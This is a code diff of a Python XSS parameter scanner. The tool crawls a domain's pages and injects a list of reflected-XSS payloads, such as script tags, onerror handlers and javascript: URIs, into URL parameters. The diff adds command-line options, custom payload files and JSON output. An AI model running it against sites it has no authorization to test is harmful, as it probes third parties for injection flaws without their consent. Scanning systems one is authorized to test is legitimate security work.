@@ -1,56 +1,39 @@
+import argparse
 import requests
 from urllib.parse import urljoin, urlparse, urlencode, parse_qsl
 from bs4 import BeautifulSoup
 import tldextract
+import json
 from concurrent.futures import ThreadPoolExecutor
 import time
 
-# 🎯 XSS Payloads for testing
-payloads = [
+# 🎯 Default XSS Payloads
+DEFAULT_PAYLOADS = [
     "<script>alert('XSS')</script>",
     "'\"><script>alert('XSS')</script>",
     "<img src='x' onerror='alert(\"XSS\")'>",
     "<svg/onload=alert('XSS')>",
     "%3Cscript%3Ealert%28'XSS'%29%3C%2Fscript%3E",
-    "';alert('XSS');//"
+    "';alert('XSS');//",
+    "javascript:alert('XSS')",  # JavaScript URI scheme
+    "' onfocus='alert(\"XSS\")' autofocus='true",  # Form-based
 ]
 
-# 🔁 Visited URLs to avoid duplicates
 visited_urls = set()
 output_results = []
 
-# ASCII Banner
-ascii_banner = r"""
- __  __  _____   _____
- \ \/ / / ____| / ____|
-  \  / | (___  | (___  
-  /  \  \___ \  \___ \ 
- /  /\ \ ____) | ____) |
-/_/  \_\_____/ |_____/
-"""
-
-def animate_ascii_banner(banner):
-    """Display the ASCII banner with an animation effect."""
-    for line in banner.splitlines():
-        print(line)
-        time.sleep(0.1)  # Adjust the speed of the animation
-
 def is_subdomain(url, domain):
-    """
-    🕵️‍♂️ Check if a URL belongs to the same domain or its subdomains.
-    """
+    """Check if a URL belongs to the same domain or its subdomains."""
     extracted_main = tldextract.extract(domain)
     extracted_url = tldextract.extract(url)
     return extracted_url.domain == extracted_main.domain and extracted_url.suffix == extracted_main.suffix
 
 def find_urls(url, domain):
-    """
-    🌐 Crawl a given URL and return a list of internal links.
-    """
+    """Crawl a given URL and return internal links."""
     urls = []
     try:
         headers = {"User-Agent": "Mozilla/5.0 (XSS Scanner)"}
-        response = requests.get(url, headers=headers, timeout=5)
+        response = requests.get(url, headers=headers, timeout=10)
         soup = BeautifulSoup(response.text, 'html.parser')
 
         for link in soup.find_all('a', href=True):
@@ -62,10 +45,8 @@ def find_urls(url, domain):
         print(f"❌ Error crawling {url}: {e}")
     return urls
 
-def test_xss(url):
-    """
-    🧪 Test XSS payloads on all parameters of a URL.
-    """
+def test_xss(url, payloads):
+    """Test XSS payloads on all parameters of a URL."""
     try:
         parsed_url = urlparse(url)
         params = dict(parse_qsl(parsed_url.query))
@@ -73,75 +54,89 @@ def test_xss(url):
 
         for param in params:
             for payload in payloads:
-                # 🚀 Inject payload into the parameter
                 test_params = params.copy()
                 test_params[param] = payload
                 test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(test_params)}"
 
                 print(f"🔍 Testing: {test_url}")
-                response = requests.get(test_url, headers=headers, timeout=5)
+                response = requests.get(test_url, headers=headers, timeout=10)
 
-                # 🔎 Check if payload reflects in the response and validate rendering
                 if payload.lower() in response.text.lower():
-                    result = f"✅ [VULNERABLE] Parameter '{param}' is vulnerable to XSS on {test_url}"
-                    print(result)
+                    result = {
+                        "url": test_url,
+                        "parameter": param,
+                        "payload": payload,
+                        "status": "VULNERABLE"
+                    }
                     output_results.append(result)
+                    print(f"✅ [VULNERABLE] {test_url}")
                     return True
-        result = f"🛡️ [SAFE] No vulnerabilities found for {url}"
-        print(result)
-        output_results.append(result)
+        print(f"🛡️ [SAFE] {url}")
     except Exception as e:
-        error_message = f"❌ Error testing {url}: {e}"
-        print(error_message)
-        output_results.append(error_message)
+        print(f"❌ Error testing {url}: {e}")
     return False
 
-def crawl_and_test(domain, output_file="xss_results.txt", max_depth=3):
-    """
-    🔍 Crawl a domain and its subdomains to find potential XSS vulnerabilities.
-    """
-    print(f"🚀 Starting crawl on domain: {domain}")
+def crawl_and_test(domain, output_file, depth, delay, payloads):
+    """Crawl a domain and test for XSS vulnerabilities."""
+    print(f"🚀 Starting scan on: {domain}")
     urls_to_test = [domain]
-    depth = 0
+    current_depth = 0
 
-    # ThreadPoolExecutor for parallel URL testing
     with ThreadPoolExecutor(max_workers=10) as executor:
-        while urls_to_test and depth < max_depth:
-            current_urls = urls_to_test[:10]  # Limit to first 10 URLs at each depth
+        while urls_to_test and current_depth < depth:
+            current_urls = urls_to_test[:10]
             urls_to_test = urls_to_test[10:]
 
-            # Crawl URLs and test them in parallel
-            futures = [executor.submit(find_urls, url, domain) for url in current_urls]
-            for future in futures:
-                urls = future.result()
-                urls_to_test.extend(urls)
-            
-            # Test the URLs for XSS vulnerabilities
-            futures = [executor.submit(test_xss, url) for url in current_urls]
-            for future in futures:
-                future.result()  # Wait for the result
+            crawl_futures = [executor.submit(find_urls, url, domain) for url in current_urls]
+            for future in crawl_futures:
+                urls_to_test.extend(future.result())
 
-            depth += 1
-    
-    # Save results to the output file automatically
+            test_futures = [executor.submit(test_xss, url, payloads) for url in current_urls]
+            for future in test_futures:
+                future.result()
+
+            current_depth += 1
+            time.sleep(delay)
+
     with open(output_file, 'w') as f:
-        f.write("\n".join(output_results))
-    print(f"\n📁 Results saved automatically to: {output_file}")
+        json.dump(output_results, f, indent=4)
+    print(f"\n📁 Results saved to: {output_file}")
+
+def load_payloads(payloads_file):
+    """Load custom payloads from a file."""
+    try:
+        with open(payloads_file, 'r') as f:
+            return [line.strip() for line in f if line.strip()]
+    except Exception as e:
+        print(f"❌ Error loading payloads: {e}")
+        return DEFAULT_PAYLOADS
 
 if __name__ == "__main__":
-    animate_ascii_banner(ascii_banner)  # Display animated ASCII banner
-    
-    print("🌟 Welcome to XSS Parameter Finder 🌟")
-    print("🔑 Example Input: https://example.com")
-    print("⚠️ Disclaimer: Use this tool only for educational purposes and authorized testing!")
-    
-    target_domain = input("🔗 Enter the target domain (e.g., https://example.com): ")
-    output_file = input("📂 Enter the name of the output file (leave blank for default 'xss_results.txt'): ").strip()
+    parser = argparse.ArgumentParser(
+        description="🔍 Professional XSS Parameter Finder"
+    )
+    parser.add_argument(
+        "domain", help="Target domain (e.g., https://example.com)"
+    )
+    parser.add_argument(
+        "-o", "--output", default="xss_results.json", help="Output file name (default: xss_results.json)"
+    )
+    parser.add_argument(
+        "-d", "--depth", type=int, default=3, help="Maximum crawl depth (default: 3)"
+    )
+    parser.add_argument(
+        "--delay", type=float, default=1, help="Delay between requests in seconds (default: 1)"
+    )
+    parser.add_argument(
+        "--payloads", help="File containing custom payloads (optional)"
+    )
 
-    # Use default filename if none is provided
-    output_file = output_file if output_file else "xss_results.txt"
-    
-    if target_domain:
-        crawl_and_test(target_domain, output_file)
-    else:
-        print("❌ Error: Please provide a valid domain.")
+    args = parser.parse_args()
+    payloads = load_payloads(args.payloads) if args.payloads else DEFAULT_PAYLOADS
+
+    try:
+        crawl_and_test(args.domain, args.output, args.depth, args.delay, payloads)
+    except KeyboardInterrupt:
+        print("\n❌ Interrupted by user.")
+    except Exception as e:
+        print(f"❌ Unexpected error: {e}")
